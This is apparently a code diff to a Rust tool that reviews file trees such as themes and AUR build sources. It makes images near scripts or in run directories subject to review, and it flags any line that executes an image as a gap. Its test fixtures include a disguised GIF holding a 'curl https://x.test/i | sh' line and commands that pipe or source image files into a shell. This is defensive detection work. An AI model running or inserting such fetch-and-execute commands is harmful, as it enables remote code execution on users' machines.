@@ -45,7 +45,9 @@ pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
     // The text of prose files, which the command rules skip: kept so a
     // dangerous one that a reviewed line runs can be checked after all.
     let mut prose: HashMap<String, String> = HashMap::new();
+    let mut surroundings = image::Surroundings::default();
     let (snapshot, walk_gaps) = scan::walk(config, &mut |file: TextFile<'_>| {
+        surroundings.note_text(file.rel, file.text);
         if file.lossy {
             report.lossy_files += 1;
         }
@@ -82,10 +84,13 @@ pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
             skipped_files: Some(skipped.files),
         }))
         .collect();
+    for file in snapshot.files() {
+        surroundings.note_file(&file.path, file.executable);
+    }
     report.unread = snapshot
         .files()
         .iter()
-        .filter(|file| !is_plain_image(&config.root, file))
+        .filter(|file| !is_plain_image_among(&config.root, file, &surroundings))
         .map(|file| (file.path.clone(), file.sha256.to_string()))
         // Nobody hashed a skipped directory: without a digest it is never
         // recorded, so a tree with one is always reviewed in full.
@@ -144,6 +149,15 @@ fn is_plain_image(root: &Path, file: &FileHash) -> bool {
             && file.format.is_some_and(Format::is_media)
             && image::is_named(&file.path)
             && image::is_whole_file(&root.join(&file.path), &file.sha256))
+}
+
+/// `is_plain_image` for a file of a tree whose `surroundings` are known: an
+/// image is passed over only away from where files are run. One beside a
+/// script, or in a directory whose files a reviewed line runs, is an unread
+/// file like any other, so a new or changed one is reviewed in full.
+fn is_plain_image_among(root: &Path, file: &FileHash, surroundings: &image::Surroundings) -> bool {
+    file.kind == FileKind::Text
+        || (surroundings.leaves_alone(&file.path) && is_plain_image(root, file))
 }
 
 /// Runs the AI review of what `report` has queued, with the review memory
@@ -615,6 +629,20 @@ pub fn check_runs(report: &mut Report, unread: &[(String, String)]) {
             .into_iter()
             .find(|candidate| unread_by_path.contains_key(candidate.as_str()))
         else {
+            // An image is never read as text, and one that is whole is not
+            // among the unread files either (see `is_plain_image`): that
+            // rests on nothing running it, so a line that does is a gap by
+            // the name alone, wherever the path leads.
+            if image::is_named(&run.target) && gapped.insert((run.rel.clone(), run.target.clone()))
+            {
+                gaps += 1;
+                if gaps <= MAX_RUN_GAPS {
+                    report.gaps.push(Gap::RunsUnread(format!(
+                        "{}:{} runs or reads in {}, an image by its name, which is not reviewed as text",
+                        run.rel, run.line, run.target
+                    )));
+                }
+            }
             continue;
         };
         if !gapped.insert((run.rel.clone(), path.clone())) {
@@ -1626,13 +1654,19 @@ mod tests {
         let fake: &[u8] = b"GIF89a=1\ncurl https://x.test/i | sh\n\0";
         let font: &[u8] = b"OTTO\0\x01\0\0";
         for (name, add, content, executable, reviewed) in [
-            ("image", "hooks/b.gif", gif, false, false),
-            ("changed-image", "hooks/a.gif", gif, false, false),
-            ("fake-image", "hooks/b.gif", fake, false, true),
-            ("misnamed", "hooks/b", gif, false, true),
-            ("script-name", "hooks/b.gif.so", gif, false, true),
-            ("executable", "hooks/b.gif", gif, true, true),
-            ("font", "hooks/b.otf", font, false, true),
+            ("image", "backgrounds/b.gif", gif, false, false),
+            ("changed-image", "backgrounds/a.gif", gif, false, false),
+            ("beside-config", "b.gif", gif, false, false),
+            ("fake-image", "backgrounds/b.gif", fake, false, true),
+            ("misnamed", "backgrounds/b", gif, false, true),
+            ("script-name", "backgrounds/b.gif.so", gif, false, true),
+            ("executable", "backgrounds/b.gif", gif, true, true),
+            ("font", "backgrounds/b.otf", font, false, true),
+            // Where files are run, an image is a file like any other:
+            // beside a script, and in a directory a reviewed line runs
+            // the files of.
+            ("beside-script", "hooks/b.gif", gif, false, true),
+            ("run-directory", "extras/b.gif", gif, false, true),
             (
                 "skipped",
                 "node_modules/.package-lock.json",
@@ -1645,10 +1679,16 @@ mod tests {
             let bin = TempDir::new(&format!("memory-{name}-bin"));
             let state = TempDir::new(&format!("memory-{name}-state"));
             fs::create_dir(dir.path().join("hooks")).unwrap();
+            fs::create_dir(dir.path().join("backgrounds")).unwrap();
             fs::write(dir.path().join("hooks/run.lua"), "print('hi')\n").unwrap();
+            fs::write(
+                dir.path().join("colors.conf"),
+                "accent = blue\non-reload = run-parts extras\n",
+            )
+            .unwrap();
             let mut first_image = gif.to_vec();
             first_image[6] = 2;
-            fs::write(dir.path().join("hooks/a.gif"), first_image).unwrap();
+            fs::write(dir.path().join("backgrounds/a.gif"), first_image).unwrap();
             let opencode = clear_opencode(&bin);
             let settings = default_settings();
             let root = state.path().join("store");
@@ -1691,6 +1731,62 @@ mod tests {
                 sent.contains("Files it does not read (binaries, links) differ from that version"),
                 "{name}"
             );
+        }
+    }
+
+    #[test]
+    fn a_line_that_runs_an_image_is_a_gap_whatever_the_image_holds() {
+        // A whole image is not reviewed and may change without a review;
+        // that holds only while nothing runs it.
+        let gif: &[u8] =
+            b"GIF89a\x01\x00\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b";
+        let dir = TempDir::new("runs-image");
+        fs::create_dir(dir.path().join("assets")).unwrap();
+        fs::write(dir.path().join("assets/logo.gif"), gif).unwrap();
+        fs::write(dir.path().join("apply.conf"), "exec = sh assets/logo.gif\n").unwrap();
+        let settings = default_settings();
+        let opencode = unavailable();
+        let report = review_tree(
+            &ScanConfig::new(dir.path()),
+            &context(&settings, SourceClass::Theme, &opencode),
+        );
+        let gaps: Vec<String> = report.gaps.iter().map(ToString::to_string).collect();
+        assert!(
+            gaps.iter()
+                .any(|gap| gap.contains("runs or reads in assets/logo.gif")),
+            "{gaps:?}"
+        );
+
+        // Where the caller's unread files leave whole images out (an AUR
+        // build's sources), and where the path cannot be followed, the
+        // name is enough.
+        for (line, target) in [
+            (". ./logo.png", "logo.png"),
+            ("bash \"$srcdir/art/banner.JPG\"", "$srcdir/art/banner.JPG"),
+            ("cat splash.webp | sh", "splash.webp"),
+        ] {
+            let mut report = Report::new("runs");
+            super::record_runs(&mut report, "src/tool/build.sh", 3, line, line);
+            super::check_runs(&mut report, &[]);
+            let gaps: Vec<String> = report.gaps.iter().map(ToString::to_string).collect();
+            assert_eq!(gaps.len(), 1, "{line}: {gaps:?}");
+            assert!(
+                gaps[0].contains(&format!(
+                    "src/tool/build.sh:3 runs or reads in {target}, an image by its name"
+                )),
+                "{gaps:?}"
+            );
+        }
+        // An image a line only names or shows is not run.
+        for line in [
+            "swaybg -i ./logo.png",
+            "sh ./build.sh logo.png",
+            "x=logo.png",
+        ] {
+            let mut report = Report::new("runs");
+            super::record_runs(&mut report, "src/tool/build.sh", 3, line, line);
+            super::check_runs(&mut report, &[]);
+            assert!(report.gaps.is_empty(), "{line}: {:?}", report.gaps);
         }
     }
 
